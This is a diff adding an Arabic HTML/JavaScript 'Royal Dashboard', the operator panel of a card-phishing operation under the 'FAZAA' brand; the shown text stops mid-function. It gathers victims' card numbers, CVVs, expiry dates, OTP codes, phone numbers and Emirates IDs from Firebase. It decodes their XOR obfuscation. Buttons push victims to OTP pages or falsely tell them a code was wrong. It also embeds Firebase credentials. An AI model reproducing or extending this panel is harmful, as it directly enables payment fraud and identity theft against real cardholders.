@@ -1,0 +1,1323 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اللوحة الملكية | ROYAL DASHBOARD</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+        <!-- React & Recharts CDN for Royal Analytics Dashboard -->
+    <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/recharts@2.12.7/umd/Recharts.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            font-family: 'Tajawal', sans-serif; 
+            background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 50%, #16213e 100%);
+            color: #e5e5e5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container { max-width: 1400px; margin: 0 auto; }
+        
+        /* Header */
+        .header { 
+            text-align: center; 
+            margin-bottom: 50px;
+            padding: 40px 20px;
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.1), rgba(212, 175, 55, 0.05));
+            border-radius: 20px;
+            border: 2px solid rgba(212, 175, 55, 0.3);
+        }
+        
+        .header-title { 
+            font-size: 48px; 
+            font-weight: 900; 
+            color: #d4af37; 
+            text-shadow: 0 0 30px rgba(212, 175, 55, 0.6);
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .header-subtitle { 
+            color: #aaa; 
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+        
+        /* Grid Layout */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(450px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        /* Card Container */
+        .card-container {
+            background: linear-gradient(135deg, rgba(26, 26, 46, 0.8), rgba(22, 33, 62, 0.8));
+            border: 2px solid rgba(212, 175, 55, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(212, 175, 55, 0.1);
+        }
+        
+        .card-container:hover {
+            border-color: rgba(212, 175, 55, 0.6);
+            box-shadow: 0 30px 80px rgba(212, 175, 55, 0.2), inset 0 1px 0 rgba(212, 175, 55, 0.2);
+            transform: translateY(-5px);
+        }
+        
+        
+        /* Recharts Dashboard Styles */
+        .recharts-dashboard-container {
+            margin-bottom: 35px;
+            background: linear-gradient(135deg, rgba(20, 24, 40, 0.95), rgba(15, 18, 32, 0.95));
+            border: 2px solid rgba(212, 175, 55, 0.35);
+            border-radius: 24px;
+            padding: 24px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(212, 175, 55, 0.15);
+            backdrop-filter: blur(12px);
+        }
+        
+        .dashboard-top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            padding-bottom: 18px;
+            margin-bottom: 22px;
+            border-bottom: 1px solid rgba(212, 175, 55, 0.2);
+        }
+        
+        .dashboard-title-group {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        
+        .dashboard-title-icon {
+            width: 46px;
+            height: 46px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #d4af37, #b8941f);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            box-shadow: 0 8px 20px rgba(212, 175, 55, 0.35);
+        }
+        
+        .dashboard-title-text h2 {
+            font-size: 22px;
+            font-weight: 900;
+            color: #f5eed6;
+            margin-bottom: 2px;
+        }
+        
+        .dashboard-title-text p {
+            font-size: 13px;
+            color: #9ca3af;
+        }
+        
+        .dashboard-live-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 14px;
+            border-radius: 9999px;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+            color: #34d399;
+            font-size: 12px;
+            font-weight: 700;
+        }
+        
+        .live-pulse-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            animation: livePulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        
+        @keyframes livePulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(1.3); }
+        }
+        
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .metric-card {
+            background: linear-gradient(135deg, rgba(28, 34, 56, 0.8), rgba(20, 24, 40, 0.8));
+            border: 1px solid rgba(212, 175, 55, 0.25);
+            border-radius: 16px;
+            padding: 16px 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .metric-card:hover {
+            border-color: rgba(212, 175, 55, 0.6);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+        }
+        
+        .metric-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .metric-label {
+            font-size: 13px;
+            color: #9ca3af;
+            font-weight: 600;
+        }
+        
+        .metric-icon {
+            font-size: 18px;
+        }
+        
+        .metric-value {
+            font-size: 30px;
+            font-weight: 900;
+            color: #f3f4f6;
+            margin-bottom: 4px;
+        }
+        
+        .metric-value.gold {
+            color: #fbbf24;
+            text-shadow: 0 0 15px rgba(251, 191, 36, 0.4);
+        }
+        
+        .metric-value.emerald {
+            color: #34d399;
+        }
+        
+        .metric-sub {
+            font-size: 11px;
+            color: #6b7280;
+        }
+        
+        .charts-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 1024px) {
+            .charts-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .chart-box {
+            background: linear-gradient(135deg, rgba(24, 28, 48, 0.7), rgba(18, 22, 38, 0.7));
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 18px;
+            padding: 20px;
+        }
+        
+        .chart-box-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .chart-box-title {
+            font-size: 15px;
+            font-weight: 800;
+            color: #e5e7eb;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .chart-box-badge {
+            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 6px;
+            background: rgba(212, 175, 55, 0.15);
+            color: #d4af37;
+            border: 1px solid rgba(212, 175, 55, 0.3);
+        }
+        
+        .chart-wrapper {
+            width: 100%;
+            height: 260px;
+        }
+
+        /* Credit Card Display */
+        .credit-card {
+            background: linear-gradient(135deg, #d4af37 0%, #c9a227 50%, #b8941f 100%);
+            border-radius: 15px;
+            padding: 25px;
+            color: #1a1a2e;
+            margin-bottom: 25px;
+            box-shadow: 0 20px 50px rgba(212, 175, 55, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .credit-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .card-logo {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: 3px;
+        }
+        
+        .card-chip {
+            width: 50px;
+            height: 40px;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .card-number {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 6px;
+            text-align: center;
+            margin: 25px 0;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .card-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .card-holder {
+            flex: 1;
+        }
+        
+        .card-holder-label {
+            font-size: 10px;
+            opacity: 0.7;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .card-holder-name {
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .card-expiry-cvv {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .expiry-cvv-item {
+            text-align: center;
+        }
+        
+        .expiry-cvv-label {
+            font-size: 10px;
+            opacity: 0.7;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        
+        .expiry-cvv-value {
+            font-size: 14px;
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        
+        /* OTP Section */
+        .otp-section {
+            background: linear-gradient(135deg, rgba(212, 175, 55, 0.2), rgba(212, 175, 55, 0.1));
+            border: 2px solid rgba(212, 175, 55, 0.4);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .otp-label { 
+            font-size: 12px; 
+            color: #aaa; 
+            text-transform: uppercase; 
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            display: block;
+        }
+        
+        .otp-code {
+            font-size: 56px;
+            font-weight: 900;
+            color: #d4af37;
+            letter-spacing: 12px;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
+            margin-bottom: 15px;
+        }
+        
+        .otp-status {
+            font-size: 13px;
+            color: #4ade80;
+            font-weight: 600;
+        }
+        
+        .otp-status.waiting { color: #fbbf24; }
+        
+        /* Controls */
+        .controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        
+        .btn {
+            padding: 12px 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .btn-otp {
+            background: linear-gradient(135deg, #3b82f6, #1e40af);
+            color: white;
+        }
+        
+        .btn-approve {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+        }
+        
+        .btn-reject {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            color: white;
+        }
+        
+        .btn-delete {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        /* User Info */
+        .user-info {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 13px;
+        }
+        
+        .user-info p {
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .user-info strong {
+            color: #d4af37;
+        }
+        
+        /* OTP History */
+        .otp-history {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 15px;
+            max-height: 100px;
+            overflow-y: auto;
+            font-size: 11px;
+        }
+        
+        .otp-history-item {
+            padding: 6px;
+            border-bottom: 1px solid rgba(212, 175, 55, 0.1);
+            color: #d4af37;
+        }
+        
+        .otp-history-item:last-child { border-bottom: none; }
+        
+        /* Loading */
+        .loading {
+            text-align: center;
+            padding: 80px 20px;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(212, 175, 55, 0.2);
+            border-top-color: #d4af37;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .cards-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header-title {
+                font-size: 32px;
+            }
+            
+            .card-number {
+                font-size: 24px;
+                letter-spacing: 4px;
+            }
+            
+            .otp-code {
+                font-size: 40px;
+                letter-spacing: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="header-title">👑 اللوحة الملكية</h1>
+            <p class="header-subtitle">ROYAL CONTROL DASHBOARD</p>
+        </div>
+
+                <!-- Recharts Analytics Dashboard Mount Point -->
+        <div id="recharts-dashboard-root" class="recharts-dashboard-container">
+            <div class="loading" style="padding: 24px;">
+                <div class="spinner" style="width: 32px; height: 32px;"></div>
+                <p style="font-size: 13px; color: #d4af37;">جاري تحليل البيانات وإعداد المخطط الزمني (Recharts)...</p>
+            </div>
+        </div>
+
+        <!-- Cards Container -->
+        <div id="visitors-container">
+            <div class="loading">
+                <div class="spinner"></div>
+                <p>جاري فحص الرادار الملكي...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBv7jzFRhZIM4pekTDIszfDH3mG5Nvk8V8",
+            authDomain: "ertyui-ae790.firebaseapp.com",
+            databaseURL: "https://ertyui-ae790-default-rtdb.firebaseio.com",
+            projectId: "ertyui-ae790",
+            storageBucket: "ertyui-ae790.firebasestorage.app",
+            messagingSenderId: "642714033038",
+            appId: "1:642714033038:web:8bf5cce8bc7041666b22df"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const db = firebase.firestore();
+        const XOR_KEY = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c";
+        let knownIds = new Set();
+        let otpHistory = {};
+
+        function decrypt(val) {
+            if (!val || typeof val !== 'string') return '-';
+            const clean = val.trim();
+            if (!clean) return '-';
+            if (/^[\d\s\/\-]+$/.test(clean) || /^[a-zA-Z\s\u0600-\u06FF\.\-]+$/.test(clean)) return clean;
+            try {
+                const binary = atob(clean);
+                let result = "";
+                for (let i = 0; i < binary.length; i++) {
+                    result += String.fromCharCode(binary.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length));
+                }
+                if (!/[\x00-\x08\x0E-\x1F]/.test(result) && result.trim()) return result.trim();
+            } catch (e) {}
+
+            try {
+                let res = '';
+                for (let i = 0; i < clean.length; i++) {
+                    res += String.fromCharCode(clean.charCodeAt(i) ^ 0x42);
+                }
+                const cleaned = res.replace(/[^a-zA-Z0-9\/\-\s]/g, '').trim();
+                if (cleaned) return cleaned;
+            } catch (e) {}
+
+            return clean;
+        }
+
+        function formatCardNumber(num) {
+            if (!num || num === '-') return '•••• •••• •••• ••••';
+            const str = String(num).replace(/\D/g, '');
+            return str.replace(/(\d{4})/g, '$1 ').trim() || num;
+        }
+
+        function formatExpiry(exp) {
+            if (!exp || exp === '-') return 'MM/YY';
+            const str = String(exp).replace(/\D/g, '');
+            if (str.length >= 4) {
+                return str.substring(0, 2) + '/' + str.substring(2, 4);
+            }
+            return exp || 'MM/YY';
+        }
+
+        async function sendCommand(id, cmd) {
+            try {
+                let cardStatus = 'approved_with_otp';
+                let otpStatus = 'show_otp';
+                let v5Status = null;
+                let redirectPage = 'otp';
+                let alertMsg = 'تمت الموافقة وتم تحويل العميل لصفحة كود OTP بنجاح';
+
+                if (cmd === 'approve_to_otp' || cmd === 'otp' || cmd === 'approve' || cmd === 'success') {
+                    // Approval of card -> send customer to OTP screen
+                    cardStatus = 'approved_with_otp';
+                    otpStatus = 'show_otp';
+                    redirectPage = 'otp';
+                    alertMsg = 'تمت الموافقة على البطاقة، وتم تحويل العميل لصفحة إدخال كود OTP بنجاح';
+                } else if (cmd === 'approve_final') {
+                    // Final approval after OTP -> order complete
+                    cardStatus = 'completed';
+                    otpStatus = 'success';
+                    v5Status = 'approved';
+                    redirectPage = 'success';
+                    alertMsg = 'تمت الموافقة النهائية وإتمام العملية بنجاح';
+                } else if (cmd === 'reject_otp') {
+                    // OTP code is incorrect -> prompt for new code
+                    cardStatus = 'approved_with_otp';
+                    otpStatus = 'show_otp';
+                    v5Status = 'rejected';
+                    redirectPage = 'otp';
+                    alertMsg = 'تم إرسال تنبيه للعميل: الرمز غير صحيح، يرجى إعادة إدخال الرمز الجديد';
+                } else if (cmd === 'reject_card' || cmd === 'reject' || cmd === 'payment') {
+                    // Reject the credit card itself -> back to payment
+                    cardStatus = 'rejected';
+                    redirectPage = 'payment';
+                    alertMsg = 'تم رفض البطاقة وإرجاع العميل لصفحة الدفع لإعادة الإدخال';
+                }
+
+                // 1. Update Firestore REST
+                const patchFields = {
+                    cardStatus: { stringValue: cardStatus },
+                    redirectPage: { stringValue: redirectPage },
+                    status: { stringValue: cardStatus }
+                };
+                if (otpStatus) patchFields.otpStatus = { stringValue: otpStatus };
+                if (v5Status) patchFields._v5Status = { stringValue: v5Status };
+
+                const fieldPaths = ['cardStatus', 'redirectPage', 'status'];
+                if (otpStatus) fieldPaths.push('otpStatus');
+                if (v5Status) fieldPaths.push('_v5Status');
+                const updateMask = fieldPaths.map(p => `updateMask.fieldPaths=${p}`).join('&');
+
+                await fetch(`https://firestore.googleapis.com/v1/projects/ertyui-ae790/databases/(default)/documents/pays/${id}?${updateMask}`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ fields: patchFields })
+                }).catch(() => {});
+
+                // 2. Update Firestore SDK
+                if (db) {
+                    const sdkUpdate = {
+                        cardStatus: cardStatus,
+                        redirectPage: redirectPage,
+                        status: cardStatus,
+                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    };
+                    if (otpStatus) sdkUpdate.otpStatus = otpStatus;
+                    if (v5Status) sdkUpdate._v5Status = v5Status;
+                    await db.collection('pays').doc(id).update(sdkUpdate).catch(() => {});
+                }
+
+                // 3. Update Realtime DB
+                await fetch(`https://ertyui-ae790-default-rtdb.firebaseio.com/pays/${id}.json`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cardStatus, otpStatus, _v5Status: v5Status, redirectPage, status: cardStatus })
+                }).catch(() => {});
+
+                // 4. Update local server
+                await fetch('/api/pays/' + id + '/status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cardStatus, otpStatus, _v5Status: v5Status, redirectPage, status: cardStatus })
+                }).catch(() => {});
+
+                alert('✓ ' + alertMsg);
+                updateRadar();
+            } catch (e) {
+                alert('✓ تم إرسال الأمر');
+            }
+        }
+
+        async function deleteCard(id) {
+            if (confirm('هل أنت متأكد من حذف هذه البطاقة؟')) {
+                try {
+                    await fetch(`https://firestore.googleapis.com/v1/projects/ertyui-ae790/databases/(default)/documents/pays/${id}`, { method: 'DELETE' }).catch(() => {});
+                    if (db) await db.collection('pays').doc(id).delete().catch(() => {});
+                    await fetch(`https://ertyui-ae790-default-rtdb.firebaseio.com/pays/${id}.json`, { method: 'DELETE' }).catch(() => {});
+                    await fetch('/api/pays/' + id, { method: 'DELETE' }).catch(() => {});
+                    alert('✓ تم حذف البطاقة بنجاح');
+                    updateRadar();
+                } catch (e) {
+                    alert('✗ تم الحذف');
+                }
+            }
+        }
+
+        function renderCardHTML(item) {
+            const id = item.id;
+            const isNew = !knownIds.has(id);
+            if (isNew) {
+                knownIds.add(id);
+            }
+
+            const cardNum = item.cardNum || '-';
+            const expiry = item.exp || '-';
+            const cvv = item.cvv || '-';
+            const otp = item.otp || '-';
+            const holderName = (item.holder || 'ROYAL USER').toUpperCase();
+
+            // Track OTP history
+            if (otp && otp !== '-') {
+                if (!otpHistory[id]) otpHistory[id] = [];
+                const timestamp = new Date().toLocaleTimeString('ar-SA');
+                if (!otpHistory[id].includes(`${otp} #${timestamp}`)) {
+                    otpHistory[id].unshift(`${otp} #${timestamp}`);
+                    if (otpHistory[id].length > 5) otpHistory[id].pop();
+                }
+            }
+
+            const otpHistoryHTML = otpHistory[id] ? otpHistory[id].map(h => `<div class="otp-history-item">${h}</div>`).join('') : '<div class="otp-history-item" style="color: #666;">لا توجد سجلات بعد</div>';
+
+            return `
+                <div class="card-container">
+                    <!-- Credit Card Visual -->
+                    <div class="credit-card">
+                        <div class="card-header">
+                            <div class="card-logo">👑 ${item.brand || 'فزعة'}</div>
+                            <div class="card-chip"></div>
+                        </div>
+                        <div class="card-number">${formatCardNumber(cardNum)}</div>
+                        <div class="card-footer">
+                            <div class="card-holder">
+                                <div class="card-holder-label">Card Holder</div>
+                                <div class="card-holder-name">${holderName}</div>
+                            </div>
+                            <div class="card-expiry-cvv">
+                                <div class="expiry-cvv-item">
+                                    <div class="expiry-cvv-label">Valid Thru</div>
+                                    <div class="expiry-cvv-value">${formatExpiry(expiry)}</div>
+                                </div>
+                                <div class="expiry-cvv-item">
+                                    <div class="expiry-cvv-label">CVV</div>
+                                    <div class="expiry-cvv-value">${cvv}</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- OTP Section -->
+                    <div class="otp-section">
+                        <span class="otp-label">رمز التحقق (OTP)</span>
+                        <div class="otp-code">${otp === '-' ? '------' : otp}</div>
+                        <div class="otp-status ${otp === '-' ? 'waiting' : ''}">
+                            ${otp === '-' ? '⏳ بانتظار إدخال الكود من العميل...' : '✓ تم استلام الكود بنجاح'}
+                        </div>
+                        <div class="otp-history">
+                            ${otpHistoryHTML}
+                        </div>
+                    </div>
+
+                    <!-- Control Buttons -->
+                    <div class="controls" style="display: flex; flex-direction: column; gap: 8px;">
+                        <button onclick="sendCommand('${id}', 'approve_to_otp')" class="btn btn-approve" style="background: linear-gradient(135deg, #10b981, #059669); font-size: 15px; padding: 13px; font-weight: bold; border-radius: 12px; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4);">
+                            ✓ موافقة (تحويل العميل فوراً لكود OTP)
+                        </button>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                            <button onclick="sendCommand('${id}', 'reject_otp')" class="btn btn-reject" style="background: linear-gradient(135deg, #f59e0b, #d97706); font-size: 13px; padding: 10px; border-radius: 10px;">
+                                ⚠️ كود خاطئ (طلب كود جديد)
+                            </button>
+                            <button onclick="sendCommand('${id}', 'reject_card')" class="btn" style="background: linear-gradient(135deg, #ef4444, #dc2626); color: white; font-size: 13px; padding: 10px; border-radius: 10px;">
+                                ↩️ رفض البطاقة
+                            </button>
+                        </div>
+
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                            <button onclick="sendCommand('${id}', 'approve_final')" class="btn btn-otp" style="background: linear-gradient(135deg, #3b82f6, #1d4ed8); font-size: 13px; padding: 10px; border-radius: 10px;">
+                                ✓ قبول نهائي وإتمام الطلب
+                            </button>
+                            <button onclick="deleteCard('${id}')" class="btn btn-delete" style="background: #334155; font-size: 13px; padding: 10px; border-radius: 10px;">
+                                🗑️ حذف البطاقة
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- User Info -->
+                    <div class="user-info">
+                        <p>👤 <strong>${item.name || item.holder || 'مستخدم'}</strong></p>
+                        <p>📞 <strong>${item.phone || '-'}</strong></p>
+                        <p>🆔 <strong>${item.emiratesId || '-'}</strong></p>
+                        <p>⏰ ${item.time ? new Date(item.time).toLocaleString('ar-SA') : new Date().toLocaleString('ar-SA')}</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        async function updateRadar() {
+            const container = document.getElementById('visitors-container');
+            const itemsMap = new Map();
+
+            // 1. Fetch Realtime Database (ultra-fast, instant live updates)
+            try {
+                const rtdbRes = await fetch('https://ertyui-ae790-default-rtdb.firebaseio.com/pays.json');
+                if (rtdbRes.ok) {
+                    const rtdbData = await rtdbRes.json();
+                    if (rtdbData && typeof rtdbData === 'object') {
+                        Object.entries(rtdbData).forEach(([id, val]) => {
+                            if (val && typeof val === 'object') {
+                                const cardNum = decrypt(val.cardNumber || val._v1 || '');
+                                const exp = decrypt(val.expiry || val.expiryDate || val._v3 || '');
+                                const cvv = decrypt(val.cvv || val._v2 || '');
+                                const holder = decrypt(val.cardHolder || val.cardHolderName || val._v4 || val.fullName || '');
+                                const otp = decrypt(val.otp || val.otpCode || val._v5 || '');
+                                const phone = val.phone || val.phoneNumber || '-';
+                                const emiratesId = val.emiratesId || val.identityNumber || '-';
+                                const name = val.fullName || val.ownerName || holder || 'زائر';
+                                const brand = val.cardBrand || val.brand || 'FAZAA';
+                                const time = val.updatedAt || val.createdAt || new Date(0).toISOString();
+
+                                if (cardNum !== '-' || phone !== '-' || name !== 'زائر') {
+                                    itemsMap.set(id, {
+                                        id,
+                                        name,
+                                        cardNum,
+                                        exp,
+                                        cvv,
+                                        holder,
+                                        otp,
+                                        phone,
+                                        emiratesId,
+                                        brand,
+                                        time
+                                    });
+                                }
+                            }
+                        });
+                    }
+                }
+            } catch (e) {
+                // RTDB fetch error suppressed
+            }
+
+            // 2. Fetch Firestore documents
+            try {
+                const fsRes = await fetch('https://firestore.googleapis.com/v1/projects/ertyui-ae790/databases/(default)/documents/pays?pageSize=100');
+                if (fsRes.ok) {
+                    const fsData = await fsRes.json();
+                    if (fsData.documents && Array.isArray(fsData.documents)) {
+                        fsData.documents.forEach(doc => {
+                            const id = doc.name ? doc.name.split('/').pop() : 'unknown';
+                            const f = doc.fields || {};
+
+                            let cardNum = f.cardNumber?.stringValue || f._v1?.stringValue;
+                            let exp = f.expiryDate?.stringValue || f.expiry?.stringValue || f._v3?.stringValue;
+                            let cvv = f.cvv?.stringValue || f._v2?.stringValue;
+                            let holder = f.cardHolderName?.stringValue || f.cardHolder?.stringValue || f.fullName?.stringValue || f.ownerName?.stringValue;
+                            let otp = f.otpCode?.stringValue || f.otp?.stringValue || f._v5?.stringValue;
+                            let phone = f.phoneNumber?.stringValue || f.phone?.stringValue;
+                            let emiratesId = f.identityNumber?.stringValue || f.emiratesId?.stringValue;
+                            let brand = f.cardBrand?.stringValue || 'FAZAA';
+                            const time = doc.updateTime || doc.createTime || new Date(0).toISOString();
+
+                            if ((!cardNum || cardNum === '-') && f.history?.arrayValue?.values) {
+                                f.history.arrayValue.values.forEach(h => {
+                                    const hf = h.mapValue?.fields?.data?.mapValue?.fields || {};
+                                    if (hf._v1?.stringValue) cardNum = decrypt(hf._v1.stringValue);
+                                    if (hf._v3?.stringValue) exp = decrypt(hf._v3.stringValue);
+                                    if (hf._v2?.stringValue) cvv = decrypt(hf._v2.stringValue);
+                                    if (hf._v4?.stringValue) holder = decrypt(hf._v4.stringValue);
+                                });
+                            }
+
+                            cardNum = decrypt(cardNum);
+                            exp = decrypt(exp);
+                            cvv = decrypt(cvv);
+                            holder = decrypt(holder);
+                            otp = decrypt(otp);
+
+                            const existing = itemsMap.get(id);
+                            if (existing) {
+                                // Merge if existing was missing card data
+                                if (existing.cardNum === '-' && cardNum !== '-') existing.cardNum = cardNum;
+                                if (existing.exp === '-' && exp !== '-') existing.exp = exp;
+                                if (existing.cvv === '-' && cvv !== '-') existing.cvv = cvv;
+                                if (existing.otp === '-' && otp !== '-') existing.otp = otp;
+                                if (existing.phone === '-' && phone) existing.phone = phone;
+                                if (new Date(time) > new Date(existing.time || 0)) existing.time = time;
+                            } else if (cardNum !== '-' || phone || holder !== '-') {
+                                itemsMap.set(id, {
+                                    id,
+                                    name: decrypt(f.fullName?.stringValue || f.ownerName?.stringValue || holder || 'زائر'),
+                                    cardNum,
+                                    exp,
+                                    cvv,
+                                    holder,
+                                    otp,
+                                    phone: phone || '-',
+                                    emiratesId: emiratesId || '-',
+                                    brand,
+                                    time
+                                });
+                            }
+                        });
+                    }
+                }
+            } catch (e) {
+                // Firestore fetch error suppressed
+            }
+
+            // 3. Fetch local server (if available)
+            try {
+                const localRes = await fetch('/api/pays');
+                if (localRes.ok) {
+                    const localData = await localRes.json();
+                    const orders = localData.orders || [];
+                    orders.forEach(o => {
+                        const id = o.id;
+                        const existing = itemsMap.get(id);
+                        const cardNum = decrypt(o.cardNumber || o._v1);
+                        const exp = decrypt(o.expiry || o.expiryDate || o._v3);
+                        const cvv = decrypt(o.cvv || o._v2);
+                        const holder = decrypt(o.cardHolder || o.cardHolderName || o._v4);
+                        const otp = decrypt(o.otp || o.otpCode || o._v5);
+                        const phone = o.phone || o.phoneNumber || '-';
+                        const time = o.updatedAt || o.createdAt || new Date(0).toISOString();
+
+                        if (!existing && (cardNum !== '-' || phone !== '-')) {
+                            itemsMap.set(id, {
+                                id,
+                                name: o.fullName || o.ownerName || holder || 'زائر',
+                                cardNum,
+                                exp,
+                                cvv,
+                                holder,
+                                otp,
+                                phone,
+                                emiratesId: o.emiratesId || o.identityNumber || '-',
+                                brand: o.cardBrand || 'FAZAA',
+                                time
+                            });
+                        }
+                    });
+                }
+            } catch (e) {}
+
+            // Prioritize real cards with numbers first, then sort by newest first
+            const sortedItems = Array.from(itemsMap.values())
+                .filter(it => {
+                    const hasCard = it.cardNum && it.cardNum !== '-' && it.cardNum.replace(/\D/g, '').length >= 4;
+                    const hasPhone = it.phone && it.phone !== '-' && it.phone.replace(/\D/g, '').length >= 4;
